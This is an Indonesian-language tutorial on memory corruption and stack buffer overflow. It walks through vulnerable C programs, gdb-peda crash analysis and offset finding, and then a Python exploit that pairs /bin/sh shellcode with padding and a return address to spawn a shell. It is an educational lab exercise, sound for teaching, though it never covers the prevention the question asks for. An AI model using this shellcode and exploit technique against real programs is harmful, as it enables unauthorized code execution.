# THR PLIS
Quest: 
- Untuk bidang code/computer program analysis: jelaskan apa itu memory corruption. Sebutkan salah satu attack vector-nya, bagaimana teknik serangannya, dan juga cara mencegahnya.

## Memory Corruption
Merupakan salah satu bug yang terjadi, karna program menerima inputan yang berlebihan sehingga memori tidak dapat mengalokasikannya. Hal ini membuat attacker dapat mengirimkan payload mereka untuk memanipulasi program yang sedang berjalan. Beberapa jenis memory corruption antara lain:
- Buffer overflow
- Dangling pointer
- etc

Sekarang, saya akan menjelaskan tentang salah satu attack vector-nya, yaitu Buffer overflow baik teknik maupun cara pencegahannya.

## Buffer Overflow
Buffer overflow merupakan eksploitasi yang memanfaatkan input yang berlebihan pada program, sehingga program mengalami memory corruption. Dengan begitu attacker dapat memodifikasi program yang sedang berjalan tersebut seperti, memasukkan payload untuk mendapatkan shell dll. Buffer overflow sendiri memiliki konsep dari struktur data yaitu stack, yang merupakan tumpukan dari bawah menuju top of stack.

- Saya akan memberikan contoh, yang terjadi pada stack dan gambaran layout memory stack
```
main: 
	push <var A>
	push <var B>
	call <func C>
```

Pada kode diatas mula-mula program, memberikan tumpukan variable dari A, B, C dan selanjutnya melakukan pemanggilan fungsi Z

```
# Layout memory stack (x86)

(Low Address)
	  ^	[	Local variable A 	] <-- ESP (Top of stack)  
	  |	---------------------------------
	  |	[	Local variable B 	]
	  |	---------------------------------
	  |	[	Saved EBP 		] <-- EBP
	  |	---------------------------------
	  |	[	Return address 		]
	  |	---------------------------------
	  |	[	Variable B 		]
	  |	---------------------------------
	  |	[	Variable A 		]
	  |	---------------------------------
```

Diatas merupakan layout memory stack yang dibuat dari kode sederhana tersebut, dan saat ini EBP-ESP menunjuk pada stack frame dari func C, dan dibawahnya merupakan stack frame yang memanggil func C, yaitu func main.

- Sekarang, saya akan menunjukkan bagaimana Bufferoverflow dapat terjadi.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
	char buffer[3];
	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
	return 0;
}
```

<img src="https://user-images.githubusercontent.com/13828056/41146057-4bb0db9c-6b2c-11e8-9d26-b9cee822f9fb.gif" width="60%"></img>

Dari kode diatas, variable buffer[3] hanya dapat menampung 3 bytes character saja, jika melebihi itu maka akan dianggap sebagai memory corruption. 

- Dari jawaban yang saya kirim pertama kemarin, saya menyinggung sedikit tentang shellcode dari attacker yang dapat melakukan manipulasi program agar mendapatkan akses shell "/bin/sh" dari program yang sedang dijalankan.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char const *argv[])
{
	char buffer[32];
	read(0, &buffer, 64);

	return 0;
}
```
- Dari sourcecode diatas, kita asumsikan ASLR dalam kondisi mati atau 0, dan kita asumsikan lagi address dari variable buffer adalah 0xffffd468

Sekarang kita lanjutkan debugging program diatas, menggunakan gdb.
```
$ gdb -q simplebuff
```
```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x08048456 <+0>:	push   ebp
   0x08048457 <+1>:	mov    ebp,esp
   0x08048459 <+3>:	sub    esp,0x20
   0x0804845c <+6>:	lea    eax,[ebp-0x20]
   0x0804845f <+9>:	push   eax
   0x08048460 <+10>:	push   0x8048510
   0x08048465 <+15>:	call   0x8048310 <printf@plt>
   0x0804846a <+20>:	add    esp,0x8
   0x0804846d <+23>:	push   0x40
   0x0804846f <+25>:	lea    eax,[ebp-0x20]
   0x08048472 <+28>:	push   eax
   0x08048473 <+29>:	push   0x0
   0x08048475 <+31>:	call   0x8048300 <read@plt>
   0x0804847a <+36>:	add    esp,0xc
   0x0804847d <+39>:	mov    eax,0x0
   0x08048482 <+44>:	leave  
   0x08048483 <+45>:	ret    
End of assembler dump.
```
- Dari address 0x0804846f diatas, didapatkan informasi jika ebp-0x20, yang berarti program akan mengalokasikan memory (16^1*2) = 32byte sesuai dengan sourcecode diatas yaitu ``char buffer[32]`` dan pada saat mengalokasikan memory tersebut akan ada penambahan 4byte untuk override EBP, maka dibutuhkan 32byte+4byte supaya dapat sampai ke alamat return address.

Sekarang saya akan memberikan gambaran, tentang konsep yang akan saya gunakan untuk memanipulasi program diatas agar mendapatkan akses shell dari program yang sedang berjalan diatas, kembali ke konsep layout memory stack.

```
# Layout memory stack (x86)

(Low Address)
	  ^	[	Shellcode		] <--------------------------------------
	  |	---------------------------------					|
	  |	[	Local variable 		]-------|				|
	  |	---------------------------------	|--> Padding - len(Shellcode)	|
	  |	[	Saved EBP 		]-------|				|
	  |	---------------------------------					|
	  |	[	Return address 		]----------------------------------------				
	  |	---------------------------------
	  |	[	 			]
	  |	[	STACK FRAME MAIN 	]
	  |	[	 			]
	  |	---------------------------------
```
- Dari konsep diatas, kita awali dengan memenuhi ``local variable`` sampai ``saved ebp``, dengan padding atau junk sehingga setelah sampai ``return address`` program akan meneksekusi ``shellcode`` yang sudah kita buat.

Sekarang kita akan melakukan pengecekan kembali, apakah benar padding yang kita butuhkan untuk sampai return address adalah 36byte, karna program dicompile 32bit maka kita dapat menggunakan cara berikut.
```
{ Saat program meminta inputan kita akan mencoba memberikan inputan 40byte, agar terjadi memory corruption }

gdb-peda$ pattern create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ run
Starting program: /home/me/Documents/buffer/simplebuff 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd418 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa\n")
EDX: 0x40 ('@')
ESI: 0xf7fa0000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41412941 ('A)AA')
ESP: 0xffffd440 --> 0xa ('\n')
EIP: 0x61414145 ('EAAa')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61414145
[------------------------------------stack-------------------------------------]
0000| 0xffffd440 --> 0xa ('\n')
0004| 0xffffd444 --> 0xffffd4d4 --> 0xffffd639 ("/home/me/Documents/buffer/simplebuff")
0008| 0xffffd448 --> 0xffffd4dc --> 0xffffd65b ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0012| 0xffffd44c --> 0xffffd464 --> 0x0 
0016| 0xffffd450 --> 0x1 
0020| 0xffffd454 --> 0x0 
0024| 0xffffd458 --> 0xf7fa0000 --> 0x1d7d6c 
0028| 0xffffd45c --> 0xf7fe575a (add    edi,0x178a6)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 in ?? ()
```
- Nah program mengalami memory corruption, sekarang kita akan mengecek offset dari 0x61414145
```
gdb-peda$ pattern offset 0x61414145
1631666501 found at offset: 36
```
- Jadi hitungan kita diawal tadi sudah benar jika, padding yang dibutuhkan untuk sampai return address adalah 36byte

Sekarang kita akan membuat payload dari shellcode yang udah ada http://shell-storm.org/shellcode/files/shellcode-517.php dengan target "/bin/sh"

```python
import struct

'''
char shellcode[] =
                                // <_start>
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80
;
'''

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
print shellcode + "A"*(36 - len(shellcode)) + struct.pack("<I", 0xffffd468)
```
- Dari payload diatas sudah sesuai dengan konsep layout memory stack yang ada diatas yaitu shellcode + (padding - len(shellcode)) + return address.

<img src="https://user-images.githubusercontent.com/13828056/41151030-bea95b08-6b39-11e8-9ff4-2e69b7d051df.png" width="60%"></img>

- Berhasil mendapatkan akses shell :tada: sekarang attacker mau persiapan buka puasa dahulu :laughing: